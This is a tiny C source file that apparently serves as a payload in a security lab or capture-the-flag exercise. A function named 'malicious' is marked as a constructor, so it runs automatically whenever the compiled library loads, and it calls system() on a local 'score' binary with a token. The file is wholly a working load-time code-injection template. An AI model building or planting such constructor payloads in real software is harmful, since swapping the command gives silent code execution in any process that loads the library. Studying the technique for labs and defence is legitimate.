#include<stdio.h>
#include<stdlib.h>
	 
static void malicious() __attribute__((constructor));
	 
void malicious() {
    system("/usr/local/bin/score f371d275-32f4-4016-a938-ecebc324a263");
}
